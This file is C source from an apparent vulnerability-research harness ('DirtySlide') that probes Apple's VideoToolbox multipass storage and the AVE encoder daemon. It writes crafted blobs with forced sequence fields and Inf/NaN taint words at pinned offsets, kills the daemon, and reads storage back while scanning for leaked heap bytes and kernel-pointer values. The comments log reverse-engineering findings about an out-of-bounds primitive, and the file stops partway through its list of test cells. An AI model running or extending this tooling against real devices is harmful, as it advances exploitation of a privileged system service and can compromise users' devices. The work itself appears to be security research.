//  probe_ave_rows_bd.m - DirtySlide ROWS B + D (the 26.6 new fronts)
//  Row B - AVE OOB-PRIMITIVE v158 = the SAME-CLASS DOUBLE-HIT discriminator.
//          v157 landed two hits (FI1 Inf + FN2 NaN, both B+575 CONS-CLASS);
//          FI1's bytes equalled v156-SA3 BIT-EXACT across boots while FN2
//          differed at equal size => content effect vs hit ordinality UNRESOLVED
//          (no same-class pair yet). v158 runs FI x5 / FN x4 / FA x3: two hits
//          of one class with equal H = content-only encoding, and then FN != FI
//          at equal B = the byte-level TAINT-DIVERGENT result. (v157 context:
//          run + console decoded: misses are pure store-lookup failures at
//          EndPass ('CopyDataAtTimeStamp data == NULL. F 0 PTS 1 ts 600'); the
//          SA3 hit consumed with B+575 = the untainted consumption class, so
//          taint-specific divergence is STILL OPEN. v157 interleaves FA/FI/FN
//          fanout grinds (untainted / lane-Inf / lane-NaN @0x5b4); the FIRST
//          untainted hit calibrates the same-run consumption reference and
//          later hits classify CONS-CLASS vs TAINT-DIVERGENT.
//          (v156 context: the fetch decompile pinned blob[0x2c] == sess+0x4054;
//          decompile (AVE_H264MultipassDataFetch @0x2a060e374) pinned the
//          content gate: blob[0x2c] must equal sess+0x4054 = the CONSUMING
//          frame number; on match the plugin slurps TEN 1574B silo slots into
//          PFD+0x58c..; on mismatch it logs saMultiPassInputSiloData[0].
//          frameNumber != frameNumber. The legacy triple-write put seq=1 in
//          EVERY slot = every consuming frame except 1 failed BY CONTENT.
//          v156: K0 X5 fresh-daemon opener + FB legacy controls + SA0-SA9
//          fanout x6 (PTS 0..5, seq=PTS) each carrying ONE pinned-offset
//          taint (+0x34/+0x40/+0x508/+0x574/+0x5b4/+0x614/+0x624/BULK).
//          HIT tag ok+2 -> FUNC dB/latency divergence vs same-run baselines
//          (cross-session H is noise: byte-identical FB cells hash differently).
//  Row D - AVE NEW-SURFACES / BLITTER-KILL: the vt_Copy NULL-plane repro
//          (guard-free on 26.6: ldrb @fn+0x40).
#include "ds_core.h"

/* v148: the storage READ-BACK - exported (T) in the 26.6 VideoToolbox, absent
 * from the SDK header. Plugin call shape: (storage, &ts, frameIndex, &out). */
extern OSStatus VTMultiPassStorageCopyDataAtTimeStamp(
    VTMultiPassStorageRef storage, const CMTime *pts, int64_t frameIndex, CFDataRef *dataOut);
extern CFTypeRef VTMultiPassStorageCopyIdentifier(VTMultiPassStorageRef storage);

/* ---- ROW B ------------------------------------------------------------ */

static int ds_mp_write_stat = 0;   /* v145: the LAST failing SetDataAtTimeStamp status (0 = all writes ok) */
static char *ds_mp_file_path = NULL;  /* v150: the explicit storage file (direct-read instrument) */

/* ---- v155: the FUNCTIONAL oracle (same-run baseline statistics) ----------
 * The verbatim-marker model is DEAD: the RE re-audit proved the blob is
 * CONSUMED as numbers (accumulate -> quantize -> SeqRC memmove), so markers
 * cannot survive. The functional oracle measures DIVERGENCE instead:
 * B bytes, H hash, per-frame latency - each F-cell vs the same-run FB*
 * baselines (the C0b calibration lesson). delta beyond the baseline spread
 * on a fetch-HIT cell = the taint reached the RC math. */
#define DS_F_BASE_MAX 8
static unsigned long g_f_base_B[DS_F_BASE_MAX];
static uint64_t g_f_base_H[DS_F_BASE_MAX];
static uint64_t g_f_base_iv[DS_F_BASE_MAX];   /* v156: mean inter-ok-cb interval (us) */
static int g_f_base_n = 0;
static void ds_f_base_reset(void) { g_f_base_n = 0; }
static void ds_f_base_add(unsigned long b, uint64_t h, uint64_t ivMeanUs)
{
    if (g_f_base_n < DS_F_BASE_MAX) {
        g_f_base_B[g_f_base_n] = b; g_f_base_H[g_f_base_n] = h; g_f_base_iv[g_f_base_n] = ivMeanUs;
        g_f_base_n++;
    }
}
/* print the divergence of cell (b,h,iv) against the same-run baseline set.
 * v156 calibration: cross-session H is NOISE (FB0-2 byte-identical recipes all
 * hashed differently at equal B) - classify ONLY on dB and latency; hEq is
 * informational. */
static void ds_f_div_print(const char *pfx, const char *jid, unsigned long b, uint64_t ivMeanUs)
{
    if (g_f_base_n == 0) return;
    unsigned long mn = g_f_base_B[0], mx = g_f_base_B[0], sum = 0;
    uint64_t ivSum = 0;
    for (int i = 0; i < g_f_base_n; i++) {
        if (g_f_base_B[i] < mn) mn = g_f_base_B[i];
        if (g_f_base_B[i] > mx) mx = g_f_base_B[i];
        sum += g_f_base_B[i];
        ivSum += g_f_base_iv[i];
    }
    double mean = (double)sum / (double)g_f_base_n;
    double spread = (double)(mx - mn);
    double d = (double)((long)b - (long)lround(mean));
    double ivMean = (double)ivSum / (double)g_f_base_n;
    const char *cls = "IN-SPREAD";
    if (spread > 0 && (d > spread || -d > spread)) cls = "DIVERGENT";
    else if (spread == 0 && d != 0) cls = "DIVERGENT";
    dprintf(STDOUT_FILENO,
            "%s  I[%s] FUNC dB=%+ld vs base mean %.1f (spread %lu..%lu n=%d) iv %lluus vs base %.0fus => %s\n",
            pfx, jid, (long)d, mean, mn, mx, g_f_base_n,
            (unsigned long long)ivMeanUs, ivMean, cls);
}

/* ---- v157: the CONSUMPTION-REFERENCE classifier --------------------------
 * History pins clean stats-consumption at B+575 (v146-B03/B05, v156-SA3) vs
 * the no-stats miss at B+487/488 = the +87 consumption class. The FIRST
 * untainted fanout HIT calibrates the exact same-run reference; later hits
 * classify against it: CONS-CLASS = consumed-but-benign, TAINT-DIVERGENT =
 * the taint changed the RC output size (THE surface-crossing result). */
static unsigned long g_f_cons_ref = 575;
static int g_f_cons_valid = 0;
static void ds_f_cons_classify(const char *pfx, const char *jid, unsigned long b)
{
    if (strncmp(jid, "FA", 2) == 0 && !g_f_cons_valid) {
        g_f_cons_ref = b;
        g_f_cons_valid = 1;
        dprintf(STDOUT_FILENO, "%s  I[%s] CONS reference CALIBRATED at B+%lu (untainted hit)\n", pfx, jid, b);
        return;
    }
    long delta = (long)((long long)b - (long long)g_f_cons_ref);
    const char *cls = (delta >= -8 && delta <= 8) ? "CONS-CLASS (consumed benignly)" :
                      ((delta > 0) ? "TAINT-DIVERGENT (+)" : "TAINT-DIVERGENT (-)");
    dprintf(STDOUT_FILENO, "%s  I[%s] CONS dB=%lu ref=%lu delta=%+ld => %s\n",
            pfx, jid, b, g_f_cons_ref, delta, cls);
}

/* v155: apply the (end-clamped) taint to a blob under construction */
static void ds_mp_apply_taint(uint8_t *bl, int blobSz, long taintOff, uint32_t taintWord)
{
    if (taintOff >= 0 && taintOff < (long)blobSz &&
        !(taintOff < 0x2c && taintOff + 4 > 0x2c)) {
        int tw = (taintOff + 4 <= (long)blobSz) ? 4 : (int)((long)blobSz - taintOff);
        for (int ti = 0; ti < tw; ti++)
            bl[taintOff + ti] = (uint8_t)((taintWord >> (8 * ti)) & 0xff);
    }
}

static void ds_mp_cell(const char *pfx, const char *jid, const char *t,
                       int blobSz, int fillByte, int set0x2c,
                       const char *specKey, long specVal, int bpFlags, int postWriteDelayMs,
                       long taintOff, uint32_t taintWord, int doReadback, int singlePts,
                       int fanout)
{
    if (g_opt_conn_poisoned) return;
    if (ds_epoch_exhausted(pfx)) return;
    char stag[40];
    snprintf(stag, sizeof(stag), "MP %s", jid);
    ds_journal_write("START", stag);
    ds_epoch_bump(pfx, jid);
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] %s blob=%dB fill=0x%02x [0x2c]=%s\n",
            pfx, st0, jid, t, blobSz, fillByte, set0x2c ? "seq" : "stale");
    int sig = 0, es = -999;
    __block VTCompressionSessionRef csOut = NULL;
    __block VTMultiPassStorageRef mpStorage = NULL;   /* v149: hoisted - survives teardown for the read-back */
    unsigned long f0 = (unsigned long)g_ave_cb_fires, o0 = (unsigned long)g_ave_cb_ok;
    unsigned long b0 = (unsigned long)g_ave_cb_bytes;
    g_ave_cb_err = 0; g_ave_cb_hash = 0;
    /* v155: reset the per-cell latency oracle */
    g_ave_cb_tlast = 0; g_ave_cb_ivn = 0; g_ave_cb_ivsum = 0; g_ave_cb_ivmax = 0;
    /* v153: arm the marker scan on the taint word (verbatim-surface test) */
    g_ave_mk[0] = (uint8_t)(taintWord & 0xff);
    g_ave_mk[1] = (uint8_t)((taintWord >> 8) & 0xff);
    g_ave_mk[2] = (uint8_t)((taintWord >> 16) & 0xff);
    g_ave_mk[3] = (uint8_t)((taintWord >> 24) & 0xff);
    g_ave_mk_on = (taintOff >= 0) ? 1 : 0;
    g_ave_mk_hits = 0;
    uint64_t t0 = mach_absolute_time();
    sig = ds_ave_guard_run_tmo(^int {
        VTCompressionSessionRef cs = NULL;
        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (sp) CFDictionarySetValue(sp, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder, kCFBooleanTrue);
        /* v146 MODE HUNT: the mode==1 selector ([sess+0x90]&0x1d==1) is a config
         * field - fire the registered multipass keys via the verbatim spec dict */
        if (specKey) {
            CFStringRef sk = CFStringCreateWithCString(NULL, specKey, kCFStringEncodingUTF8);
            long sv = specVal;
            CFNumberRef sn = CFNumberCreate(NULL, kCFNumberLongType, &sv);
            if (sk && sn) CFDictionarySetValue(sp, sk, sn);
            if (sk) CFRelease(sk);
            if (sn) CFRelease(sn);
        }
        OSStatus csSt = VTCompressionSessionCreate(NULL, 1920, 1080, kCMVideoCodecType_H264,
                                                   sp, NULL, NULL, ave_out_cb, NULL, &cs);
        if (sp) CFRelease(sp);
        if (csSt != 0 || !cs) return (int)csSt;
        /* v151: REVERT to the NULL fileURL (the v150 explicit-path create died
         * -12204 @13ms = the create/bind rejects a foreign path) and DISCOVER
         * the backing store via the exported VTMultiPassStorageCopyIdentifier. */
        int r = (int)VTMultiPassStorageCreate(kCFAllocatorDefault, NULL,
                                              kCMTimeRangeInvalid, NULL, &mpStorage);
        if (r == 0 && mpStorage) {
            CFTypeRef ident = VTMultiPassStorageCopyIdentifier(mpStorage);
            if (ident) {
                char ib[256] = {0};
                if (CFGetTypeID(ident) == CFStringGetTypeID())
                    CFStringGetCString((CFStringRef)ident, ib, sizeof(ib), kCFStringEncodingUTF8);
                else if (CFGetTypeID(ident) == CFDataGetTypeID()) {
                    CFIndex il = CFDataGetLength((CFDataRef)ident);
                    const uint8_t *ip = CFDataGetBytePtr((CFDataRef)ident);
                    for (int bi = 0; bi < 24 && bi < il; bi++)
                        snprintf(ib + (size_t)bi * 2, sizeof(ib) - (size_t)bi * 2, "%02x", ip[bi]);
                } else snprintf(ib, sizeof(ib), "type=%lu", (unsigned long)CFGetTypeID(ident));
                dprintf(STDOUT_FILENO, "%s  I[%s] IDENT: %s\n", pfx, jid, ib);
                CFRelease(ident);
            } else dprintf(STDOUT_FILENO, "%s  I[%s] IDENT: NULL\n", pfx, jid);
        }
        if (r != 0 || !mpStorage) { VTCompressionSessionInvalidate(cs); CFRelease(cs); return r ? r : -9998; }
        /* v145 BIND-FIRST: the 23:32 daemon log proved the fetch looks up exactly
         * our blob's PTS (F 0 PTS 1 ts 600) and still gets NULL = the pre-bind
         * write lands in an unbound segment (or fails silently). Bind the storage
         * to the session FIRST, then write, and LOG the write status + error. */
        OSStatus r2 = VTSessionSetProperty(cs, kVTCompressionPropertyKey_MultiPassStorage, mpStorage);
        if (r2 != 0) { CFRelease(mpStorage); VTCompressionSessionInvalidate(cs); CFRelease(cs); return (int)r2; }
        /* v145: write at PTS 0 AND 1 AND 2 (cover the lookup keys), log each status */
        ds_mp_write_stat = 0;
        int wrOk = 0;
        if (fanout > 0) {
            /* v156 SEQ-FANOUT: the fetch decompile pinned the content gate -
             * blob[0x2c] must equal sess+0x4054 = the CONSUMING FRAME NUMBER
             * (mismatch prints 'saMultiPassInputSiloData[0].frameNumber (%d)
             * != frameNumber %d'). The legacy triple wrote seq=1 into EVERY
             * slot, so every consuming frame except 1 mismatched BY CONTENT
             * (a second failure source on top of the commit race). Fanout
             * writes N blobs at PTS 0..N-1 with [0x2c]=PTS so whichever
             * (frame -> entry) alignment the lookup uses finds a matching
             * seq. On match the fetch slurps 10 silo slots (1574B each). */
            int n = fanout;
            for (int pi = 0; pi < n; pi++) {
                uint8_t *bl = (uint8_t *)malloc((size_t)blobSz);
                if (!bl) break;
                memset(bl, fillByte, (size_t)blobSz);
                bl[0] = 0; bl[1] = 0; bl[2] = 0; bl[3] = 0;
                if (blobSz > 0x30) bl[0x2c] = (uint8_t)pi;   /* seq == entry index */
                ds_mp_apply_taint(bl, blobSz, taintOff, taintWord);
                CFDataRef mpData = CFDataCreate(kCFAllocatorDefault, bl, (CFIndex)blobSz);
                free(bl);
                if (!mpData) break;
                CMTime pts = CMTimeMake(pi, 600);
                OSStatus ws = VTMultiPassStorageSetDataAtTimeStamp(mpStorage, &pts, mpData, NULL);
                if (ws != 0) { ds_mp_write_stat = (int)ws; dprintf(STDOUT_FILENO, "%s  I[%s] SetData(PTS %d seq %d) FAILED st=%d\n", pfx, jid, pi, pi, (int)ws); }
                else wrOk++;
                CFRelease(mpData);
            }
            dprintf(STDOUT_FILENO, "%s  I[%s] FANOUT blob writes ok=%d/%d (PTS 0..%d @600, seq=PTS)\n",
                    pfx, jid, wrOk, n, n - 1);
        } else {
            /* legacy single-blob path (v152 surgical or v145 triple) */
            uint8_t *bl = (uint8_t *)malloc((size_t)blobSz);
            if (!bl) { CFRelease(mpStorage); VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
            memset(bl, fillByte, (size_t)blobSz);
            bl[0] = 0; bl[1] = 0; bl[2] = 0; bl[3] = 0;
            if (set0x2c && blobSz > 0x30) bl[0x2c] = 1;   /* seq match: blob serves frame 1 */
            ds_mp_apply_taint(bl, blobSz, taintOff, taintWord);
            CFDataRef mpData = CFDataCreate(kCFAllocatorDefault, bl, (CFIndex)blobSz);
            free(bl);
            if (!mpData) { CFRelease(mpStorage); VTCompressionSessionInvalidate(cs); CFRelease(cs); return -9999; }
            /* v152: singlePts >= 0 = ONE surgical write at that PTS;
             * singlePts < 0 = the v145 0/1/2 triple (all slots seq=1). */
            if (singlePts >= 0) {
                CMTime pts = CMTimeMake(singlePts, 600);
                OSStatus ws = VTMultiPassStorageSetDataAtTimeStamp(mpStorage, &pts, mpData, NULL);
                if (ws != 0) { ds_mp_write_stat = (int)ws; dprintf(STDOUT_FILENO, "%s  I[%s] SetData(PTS %d) FAILED st=%d\n", pfx, jid, singlePts, (int)ws); }
                else wrOk++;
                dprintf(STDOUT_FILENO, "%s  I[%s] blob write ok=%d/1 (PTS %d @600 ONLY)\n", pfx, jid, wrOk, singlePts);
            } else {
                for (int pi = 0; pi < 3; pi++) {
                    CMTime pts = CMTimeMake(pi, 600);
                    OSStatus ws = VTMultiPassStorageSetDataAtTimeStamp(mpStorage, &pts, mpData, NULL);
                    if (ws != 0) { ds_mp_write_stat = (int)ws; dprintf(STDOUT_FILENO, "%s  I[%s] SetData(PTS %d) FAILED st=%d\n", pfx, jid, pi, (int)ws); }
                    else wrOk++;
                }
                dprintf(STDOUT_FILENO, "%s  I[%s] blob writes ok=%d/3 (PTS 0,1,2 @600)\n", pfx, jid, wrOk);
            }
            CFRelease(mpData);
        }
        if (postWriteDelayMs > 0) usleep(postWriteDelayMs * 1000);   /* v147: the write-flush race fix */
        OSStatus b = VTCompressionSessionPrepareToEncodeFrames(cs);
        if (b == 0) b = (int)VTCompressionSessionBeginPass(cs, (uint32_t)bpFlags, NULL);
        if (b == 0) {
            CVPixelBufferRef pb = NULL;
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (attrs && iosProps) {
                CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
                CVReturn cr = CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_422YpCbCr8, attrs, &pb);
                if (cr == 0 && pb && CVPixelBufferLockBaseAddress(pb, 0) == 0) {
                    memset(CVPixelBufferGetBaseAddress(pb), 0x41,
                           (size_t)CVPixelBufferGetBytesPerRow(pb) * 1080);
                    CVPixelBufferUnlockBaseAddress(pb, 0);
                }
                for (int f = 0; b == 0 && f < 2; f++)
                    b = VTCompressionSessionEncodeFrame(cs, pb, CMTimeMake(f, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
                if (pb) CVBufferRelease(pb);
            } else b = -9999;
            if (attrs) CFRelease(attrs);
            if (iosProps) CFRelease(iosProps);
        }
        if (b == 0) {
            Boolean further = false;
            OSStatus e1 = VTCompressionSessionEndPass(cs, &further, NULL);
            /* v154 G07: force the second pass (the re-fetch shot after the
             * daemon had a full pass to commit our writes) */
            if (e1 == 0 && !further && set0x2c == 2) further = true;
            if (e1 == 0 && further) {
                /* the round-trip: pass 2 re-encodes - the fetch consumes our blob */
                b = (int)VTCompressionSessionBeginPass(cs, 0, NULL);
                CVPixelBufferRef pb2 = NULL;
                CFMutableDictionaryRef at2 = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                CFMutableDictionaryRef io2 = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                if (at2 && io2) {
                    CFDictionarySetValue(at2, kCVPixelBufferIOSurfacePropertiesKey, io2);
                    if (CVPixelBufferCreate(NULL, 1920, 1080, kCVPixelFormatType_422YpCbCr8, at2, &pb2) == 0 && pb2) {
                        if (CVPixelBufferLockBaseAddress(pb2, 0) == 0) {
                            memset(CVPixelBufferGetBaseAddress(pb2), 0x41,
                                   (size_t)CVPixelBufferGetBytesPerRow(pb2) * 1080);
                            CVPixelBufferUnlockBaseAddress(pb2, 0);
                        }
                        for (int f = 0; b == 0 && f < 2; f++)
                            b = VTCompressionSessionEncodeFrame(cs, pb2, CMTimeMake(f, 600), CMTimeMake(1, 600), NULL, NULL, NULL);
                        CVBufferRelease(pb2);
                    }
                }
                if (at2) CFRelease(at2);
                if (io2) CFRelease(io2);
                if (b == 0) { Boolean f2 = false; (void)VTCompressionSessionEndPass(cs, &f2, NULL); }
            }
        }
        if (b == 0) b = VTCompressionSessionCompleteFrames(cs, kCMTimeInvalid);
        csOut = cs;
        return (int)b;
    }, &es, 12000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (csOut) ds_opt_teardown(pfx, jid, csOut);
    /* v149: the READ-BACK moves POST-TEARDOWN - FlushStats fires at Invalidate,
     * so the poisoned entries (with the leaked heap bytes) only exist in the
     * storage after the session is gone. 200ms settle, then read PTS 0/1/2. */
    if (doReadback && mpStorage) {
        usleep(200000);
        /* mode A: the API read with flags=1 (the remote dispatch - the daemon store) */
        for (int pi = 0; pi < 3; pi++) {
            CMTime rpts = CMTimeMake(pi, 600);
            CFDataRef out = NULL;
            OSStatus rs = VTMultiPassStorageCopyDataAtTimeStamp(mpStorage, &rpts, 0, &out);
            if (rs == 0 && out) {
                CFIndex rl = CFDataGetLength(out);
                const uint8_t *rp = CFDataGetBytePtr(out);
                char hx[40] = {0};
                for (int bi = 0; bi < 16 && bi < rl; bi++)
                    snprintf(hx + (size_t)bi * 2, sizeof(hx) - (size_t)bi * 2, "%02x", rp[bi]);
                int diff = 0, kptr = 0;
                for (int bi = 8; bi + 8 <= rl && bi < 1574; bi += 8) {
                    uint64_t q; memcpy(&q, rp + bi, 8);
                    if ((q >> 48) == 0xffff) kptr++;
                }
                for (int bi = 8; bi < 16 && bi < rl; bi++) if (rp[bi] != 0x5a) diff++;
                dprintf(STDOUT_FILENO, "%s  I[%s] RBAPI1 PTS %d: len=%ld first16=%s nonBlob=%d kptrQwords=%d\n",
                        pfx, jid, pi, (long)rl, hx, diff, kptr);
                CFRelease(out);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[%s] RBAPI1 PTS %d: st=%d out=NULL\n", pfx, jid, pi, (int)rs);
            }
        }
        /* mode B: the API read with flags=4 (bit0 clear = the LOCAL-file dispatch) */
        for (int pi = 0; pi < 3; pi++) {
            CMTime rpts = (CMTime){ .value = pi, .timescale = 600, .flags = 4, .epoch = 0 };
            CFDataRef out = NULL;
            OSStatus rs = VTMultiPassStorageCopyDataAtTimeStamp(mpStorage, &rpts, 0, &out);
            if (rs == 0 && out) {
                CFIndex rl = CFDataGetLength(out);
                const uint8_t *rp = CFDataGetBytePtr(out);
                char hx[40] = {0};
                for (int bi = 0; bi < 16 && bi < rl; bi++)
                    snprintf(hx + (size_t)bi * 2, sizeof(hx) - (size_t)bi * 2, "%02x", rp[bi]);
                int diff = 0, kptr = 0;
                for (int bi = 8; bi + 8 <= rl && bi < 1574; bi += 8) {
                    uint64_t q; memcpy(&q, rp + bi, 8);
                    if ((q >> 48) == 0xffff) kptr++;
                }
                for (int bi = 8; bi < 16 && bi < rl; bi++) if (rp[bi] != 0x5a) diff++;
                dprintf(STDOUT_FILENO, "%s  I[%s] RBAPI4 PTS %d: len=%ld first16=%s nonBlob=%d kptrQwords=%d\n",
                        pfx, jid, pi, (long)rl, hx, diff, kptr);
                CFRelease(out);
            } else {
                dprintf(STDOUT_FILENO, "%s  I[%s] RBAPI4 PTS %d: st=%d out=NULL\n", pfx, jid, pi, (int)rs);
            }
        }
    }
    /* mode C: the DIRECT FILE read - the dispatch-proof instrument */
    if (ds_mp_file_path) {
        int fd = open(ds_mp_file_path, O_RDONLY);
        if (fd < 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] RBFILE: open errno=%d\n", pfx, jid, errno);
        } else {
            off_t fsz = lseek(fd, 0, SEEK_END);
            dprintf(STDOUT_FILENO, "%s  I[%s] RBFILE: size=%lld\n", pfx, jid, (long long)fsz);
            if (fsz > 64) {
                lseek(fd, fsz - 96, SEEK_SET);
                uint8_t tail[96];
                ssize_t rd = read(fd, tail, sizeof(tail));
                if (rd > 0) {
                    char hx[64] = {0};
                    for (int bi = 0; bi < 28 && bi < rd; bi++)
                        snprintf(hx + (size_t)bi * 2, sizeof(hx) - (size_t)bi * 2, "%02x", tail[bi]);
                    dprintf(STDOUT_FILENO, "%s  I[%s] RBFILE tail28=%s\n", pfx, jid, hx);
                }
            } else if (fsz > 0) {
                uint8_t head[64];
                lseek(fd, 0, SEEK_SET);
                ssize_t rd = read(fd, head, sizeof(head));
                if (rd > 0) {
                    char hx[64] = {0};
                    for (int bi = 0; bi < 28 && bi < rd; bi++)
                        snprintf(hx + (size_t)bi * 2, sizeof(hx) - (size_t)bi * 2, "%02x", head[bi]);
                    dprintf(STDOUT_FILENO, "%s  I[%s] RBFILE head28=%s\n", pfx, jid, hx);
                }
            }
            close(fd);
        }
        free(ds_mp_file_path);
        ds_mp_file_path = NULL;
    }
    if (mpStorage) CFRelease(mpStorage);   /* v149: our create-ref (the session retain died with it) */
    if (sig == SIGALRM) {
        g_opt_conn_poisoned = 1;
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (12s) = WEDGED (the v103 RPC-wedge class)\n", pfx, jid);
    } else if (sig > 0) {
        ds_journal_write("DONE", stag);
        dprintf(STDOUT_FILENO, "%s  I[%s] sig=%d CLIENT-FAULT @0x%lx\n", pfx, jid, sig, (unsigned long)g_ave_fault_addr);
    }
    if (sig == 0) {
        unsigned long df = (unsigned long)g_ave_cb_fires - f0;
        unsigned long dO = (unsigned long)g_ave_cb_ok - o0;
        unsigned long dB = (unsigned long)g_ave_cb_bytes - b0;
        const char *vd = (dO > 0) ? "ACCEPT" : (df > 0) ? "DROP" : (es != 0) ? "REJECT" : "NO-CB";
        if (strcmp(vd, "ACCEPT") != 0 && (es == -12912 || es == -12914)) vd = "KILLED";
        ds_journal_write("DONE", stag);
        /* v155: latency receipt (inter-ok-cb intervals) + functional divergence */
        uint64_t ivn = (uint64_t)g_ave_cb_ivn, ivs = g_ave_cb_ivsum, ivx = g_ave_cb_ivmax;
        uint64_t hNow = g_ave_cb_hash;
        uint64_t ivMeanUs = ivn ? ivs / ivn : 0;
        /* v156: the fetch-decode HIT signature - BOTH frames encode ok (dO>=2).
         * The miss signature is ok+1 with frame-2 -17691 (fetch-fail poisons
         * the pass). Tag it explicitly so the run log is self-decoding. */
        const char *hit = (dO >= 2) ? "FETCH-HIT" : ((es != 0) ? "MISS(f2-err)" : "MISS");
        dprintf(STDOUT_FILENO,
                "%s  I[%s] es=%d cb+%lu ok+%lu B+%lu err=%d wrSt=%d mkHits=%d t=%.0fms ivN=%llu ivMean=%lluus ivMax=%lluus H=%016llx %s VERDICT=%s\n",
                pfx, jid, es, df, dO, dB, (int)g_ave_cb_err, ds_mp_write_stat, g_ave_mk_hits, tMs,
                (unsigned long long)ivn,
                (unsigned long long)ivMeanUs,
                (unsigned long long)ivx, (unsigned long long)hNow, hit, vd);
        if (strncmp(jid, "FB", 2) == 0 && strcmp(vd, "ACCEPT") == 0)
            ds_f_base_add(dB, hNow, ivMeanUs);
        else if (dO >= 2) {
            ds_f_div_print(pfx, jid, dB, ivMeanUs);   /* divergence vs the FB-miss baselines */
            ds_f_cons_classify(pfx, jid, dB);          /* v157: consumed-only vs taint-divergent */
        }
        if (strcmp(vd, "KILLED") == 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] DAEMON DIED - .ips is the receipt; 12s respawn wait\n", pfx, jid);
            usleep(12000000);
        }
        if (strcmp(vd, "NO-CB") == 0) {
            dprintf(STDOUT_FILENO, "%s  I[%s] NO-CB = conn suspect - row stops\n", pfx, jid);
            g_opt_conn_poisoned = 1;
        }
    }
    usleep(80000);
}

void  probe_ave_oob(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== B. AVE OOB (v158 - the SAME-CLASS DOUBLE-HIT discriminator) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  v157 decoded: hits FI1/FN2 both consumed at B+575 (console Proc: 2,\n", pfx);
    dprintf(STDOUT_FILENO, "%s  zero silo-mismatch lines ever - the store lookup is the ONLY gate).\n", pfx);
    dprintf(STDOUT_FILENO, "%s  FI1 bytes == v156-SA3 bytes BIT-EXACT across boots (Inf, pos7, hit#1);\n", pfx);
    dprintf(STDOUT_FILENO, "%s  FN2 (NaN) differed at equal size => content effect OR hit ordinality.\n", pfx);
    /* v156 K0 opener retained: fresh daemon normalizes session indexing. */
    dprintf(STDOUT_FILENO, "%s  I[K0] X5 daemon reset - the fresh-daemon opener\n", pfx);
    ds_tk_kill(pfx, "K0 fresh-daemon");
    dprintf(STDOUT_FILENO, "%s  I[B00 control] plain encode (must ACCEPT)\n", pfx);
    ds_epoch_bump(pfx, "B00 control");
    ds_ave_replay(pfx, "B00 control", 1920, 1080, 1920, kCMVideoCodecType_H264, kCVPixelFormatType_422YpCbCr8, 1, 1);
    ds_f_base_reset();
    g_f_cons_valid = 0;
    ds_mp_cell(pfx, "FB0", "BASELINE legacy triple seq=1 (miss-class ref)", 1574, 0x00, 1, NULL, 0, 0, 500, -1, 0, 0, -1, 0);
    /* v158 ladder: FI x5 / FN x4 / FA x3 interleaved - the DECISIVE test needs
     * TWO hits of the SAME class: equal H => stats bytes are content-only
     * (ordinality-free); then FN != FI at equal B = TAINT-DIVERGENT at byte
     * level. Unequal same-class H => encoder-state ordinality rules. */
    ds_mp_cell(pfx, "FA0", "FANOUT untainted (cons-ref candidate)", 1574, 0x00, 1, NULL, 0, 0, 500, -1, 0, 0, -1, 6);
    ds_mp_cell(pfx, "FI0", "FANOUT FLANE-INF @0x5b4 (Inf 1/5)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7F800000u, 0, -1, 6);
    ds_mp_cell(pfx, "FI1", "FANOUT FLANE-INF @0x5b4 (Inf 2/5)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7F800000u, 0, -1, 6);
    ds_mp_cell(pfx, "FN0", "FANOUT FLANE-NaN @0x5b4 (NaN 1/4)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7FC00000u, 0, -1, 6);
    ds_mp_cell(pfx, "FA1", "FANOUT untainted (cons-ref candidate)", 1574, 0x00, 1, NULL, 0, 0, 500, -1, 0, 0, -1, 6);
    ds_mp_cell(pfx, "FI2", "FANOUT FLANE-INF @0x5b4 (Inf 3/5)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7F800000u, 0, -1, 6);
    ds_mp_cell(pfx, "FN1", "FANOUT FLANE-NaN @0x5b4 (NaN 2/4)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7FC00000u, 0, -1, 6);
    ds_mp_cell(pfx, "FA2", "FANOUT untainted (cons-ref candidate)", 1574, 0x00, 1, NULL, 0, 0, 500, -1, 0, 0, -1, 6);
    ds_mp_cell(pfx, "FI3", "FANOUT FLANE-INF @0x5b4 (Inf 4/5)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7F800000u, 0, -1, 6);
    ds_mp_cell(pfx, "FN2", "FANOUT FLANE-NaN @0x5b4 (NaN 3/4)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7FC00000u, 0, -1, 6);
    ds_mp_cell(pfx, "FI4", "FANOUT FLANE-INF @0x5b4 (Inf 5/5)", 1574, 0x00, 1, NULL, 0, 0, 500, 0x5b4, 0x7F800000u, 0, -1, 6);
